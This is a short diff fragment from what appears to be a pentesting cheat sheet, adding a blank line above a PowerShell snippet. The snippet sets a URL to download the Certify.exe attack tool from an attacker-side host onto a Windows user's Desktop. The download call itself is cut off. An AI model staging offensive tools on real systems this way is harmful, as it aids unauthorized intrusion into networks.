@@ -10,6 +10,7 @@ x86_64-w64-mingw32-gcc -o test.exe test.c
 Download file using PowerShell:
 ---
 #powershell #download #windows
+
 ```powershell
 $URL="http://$LOCAL_IP/Certify.exe"
 $PATH="c:\users\$USER\Desktop\certify.exe"
